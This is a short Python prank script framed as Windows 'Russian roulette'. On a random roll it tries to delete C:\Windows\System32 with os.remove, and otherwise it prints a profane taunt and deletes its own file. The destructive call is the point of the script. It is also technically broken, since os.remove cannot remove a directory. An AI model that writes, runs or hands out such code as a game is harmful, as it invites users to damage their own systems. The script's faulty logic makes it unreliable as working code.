import random
import os
import sys
import time

filename = "russianroulette-windows.py"

if random.randint(0, 6) == 1:
    os.remove("C:\Windows\System32")
    print("Rest in peace, forever miss!")
else:
    print("Wow, you're fucking lucky! Don't touch this file EVER AGAIN.")
    time.sleep(1)
    print("Okay. This file will force close and deleted...Right now.")
    os.remove(filename)
    sys.exit(1)